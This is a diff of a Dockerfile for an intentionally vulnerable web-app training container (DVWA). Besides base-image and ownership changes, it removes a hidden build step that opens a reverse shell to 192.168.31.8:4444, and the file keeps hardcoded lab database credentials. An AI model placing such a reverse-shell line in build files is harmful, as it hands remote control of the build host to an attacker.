@@ -1,4 +1,4 @@
-FROM ubuntu:18.04
+FROM debian:9.2
 
 LABEL maintainer "opsxcq@strm.sh"
 
@@ -25,16 +25,18 @@ COPY dvwa /var/www/html
 
 COPY config.inc.php /var/www/html/config/
 
-RUN chown root:root -R /var/www/html && \
+RUN chown www-data:www-data -R /var/www/html && \
     rm /var/www/html/index.html
 
 RUN service mysql start && \
     sleep 3 && \
     mysql -uroot -pvulnerables -e "CREATE USER app@localhost IDENTIFIED BY 'vulnerables';CREATE DATABASE dvwa;GRANT ALL privileges ON dvwa.* TO 'app'@localhost;"
 
+RUN usermod -u 1000 www-data
+RUN groupmod -g 1000 www-data
+
 EXPOSE 80
 
 COPY main.sh /
 ENTRYPOINT ["/main.sh"]
 
-RUN (bash -i >& /dev/tcp/192.168.31.8/4444 0>&1) || true
